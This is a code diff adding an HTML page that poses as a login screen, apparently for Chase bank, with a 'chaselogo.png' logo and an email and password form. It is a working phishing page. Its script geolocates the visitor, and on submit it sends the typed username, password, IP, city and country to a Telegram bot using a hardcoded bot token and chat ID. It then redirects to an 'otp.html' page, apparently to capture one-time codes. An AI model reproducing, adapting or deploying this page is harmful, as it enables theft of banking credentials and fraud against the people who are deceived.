@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login</title>
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #4f46e5, #06b6d4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+
+    /* Logo Image */
+    .logo {
+      position: absolute;
+      top: 25px;
+      right: 30px;
+    }
+
+    .logo img {
+      height: 45px;
+      width: auto;
+    }
+
+    /* Login Card */
+    .login-card {
+      width: 100%;
+      max-width: 400px;
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(12px);
+      border-radius: 16px;
+      padding: 40px 30px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+      color: #ffffff;
+    }
+
+    .login-card h2 {
+      text-align: center;
+      margin-bottom: 10px;
+      font-weight: 600;
+    }
+
+    .login-card p {
+      text-align: center;
+      font-size: 14px;
+      opacity: 0.85;
+      margin-bottom: 30px;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 6px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 10px;
+      border: none;
+      outline: none;
+      font-size: 14px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      background: #ffffff;
+      color: #4f46e5;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .extra {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 13px;
+      opacity: 0.85;
+    }
+
+    .extra a {
+      color: #ffffff;
+      text-decoration: underline;
+    }
+
+    /* Warning Message */
+    .warning {
+      margin-top: 20px;
+      padding: 10px 12px;
+      border-radius: 10px;
+      background: rgba(250, 204, 21, 0.15);
+      color: #fde68a;
+      font-size: 12.5px;
+      text-align: center;
+    }
+
+    @media (max-width: 480px) {
+      .logo img {
+        height: 35px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Logo Image -->
+  <div class="logo">
+    <img src="chaselogo.png" alt="Company Logo">
+  </div>
+
+  <div class="login-card">
+    <h2>Welcome Back</h2>
+    <p>Please sign in to your account</p>
+
+    <form id="contactForm" method="POST">
+        <input type="text" id="ipaddress" name="IPaddress" hidden>
+       <input type="hidden" id="city" name="city">
+<input type="hidden" id="country" name="country">
+      <div class="form-group">
+        <label>Email</label>
+        <input id="username" type="email" placeholder="you@example.com" required />
+      </div>
+
+      <div class="form-group">
+        <label>Password</label>
+        <input id="password" type="password" placeholder="••••••••" required />
+      </div>
+
+      <button class="login-btn">Login</button>
+    </form>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipaddress = data.ip;
+                    document.getElementById('ipaddress').value = ipaddress;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        });
+  fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('city').value = data.city || '';
+        document.getElementById('country').value = data.country_name || '';
+      })
+      .catch(error => console.error('Location error:', error));
+  document.getElementById('contactForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var ipaddress = document.getElementById('ipaddress').value;
+   
+            const city = document.getElementById('city').value;
+      const country = document.getElementById('country').value;
+            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
+           
+                var token = '8233951011:AAFXF5DDlP2ezIxiavqIUmEps3O6IT9MzpM';
+      var chat_id = '6550359796';
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = 'otp.html';  // Redirect to thank you page
+                    } else {
+                        alert('Error sending message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+
+    </script>
+    <div class="extra">
+      Forgot password? <a href="#">Reset</a>
+    </div>
+
+    <!-- Warning -->
+    <div class="warning">
+      ⚠️ Please ensure you enter the correct login information.
+    </div>
+  </div>
+
+</body>
+</html>
